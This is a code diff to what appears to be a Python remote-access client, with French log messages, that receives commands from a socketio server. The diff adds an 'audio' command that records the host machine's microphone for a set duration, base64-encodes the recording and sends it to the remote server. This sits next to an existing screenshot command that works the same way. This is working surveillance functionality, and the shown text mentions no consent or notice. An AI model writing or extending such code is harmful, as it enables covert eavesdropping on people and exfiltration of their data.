@@ -2,7 +2,9 @@ import base64
 import io
 import platform
 import time
+import wave
 
+import pyaudio
 import pyautogui
 import socketio
 from PIL import Image
@@ -42,6 +44,11 @@ def command(data):
     if command == 'screenshot':
         log_event("Commande de capture d'écran reçue")
         take_and_send_screenshot()
+    elif command == 'audio':
+        log_event("Commande d'enregistrement audio reçue")
+        params = data.get('params', {})
+        duration = int(params.get('duration', 10))
+        record_and_send_audio(duration)
     else:
         log_event(f"Commande non reconnue: {command}")
 
@@ -73,6 +80,41 @@ def take_and_send_screenshot():
         log_event("Capture d'écran envoyée")
     except Exception as e:
         log_event(f"Echec de la capture d'écran: {e}")
+
+
+def record_and_send_audio(duration=10):
+    try:
+        audio = pyaudio.PyAudio()
+        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
+        frames = []
+        for i in range(0, int(44100 / 1024 * duration)):
+            data = stream.read(1024)
+            frames.append(data)
+        stream.stop_stream()
+        stream.close()
+        audio.terminate()
+
+        audio_bytes = b''.join(frames)
+        audio_io = io.BytesIO()
+        save_wave_file(audio_io, audio_bytes)
+
+        audio_io.seek(0)
+        audio_encoded = base64.b64encode(audio_io.read()).decode()
+
+        if not sio.connected:
+            log_event("En attente de connexion pour envoyer l'audio...")
+        sio.emit('audio_response', {'audio': audio_encoded})
+        log_event("Audio envoyé")
+    except Exception as e:
+        log_event(f"Echec de l'audio: {e}")
+
+
+def save_wave_file(file_io, audio_data):
+    with wave.open(file_io, 'wb') as wave_file:
+        wave_file.setnchannels(1)
+        wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
+        wave_file.setframerate(44100)
+        wave_file.writeframes(audio_data)
 
 
 def attempt_reconnect():
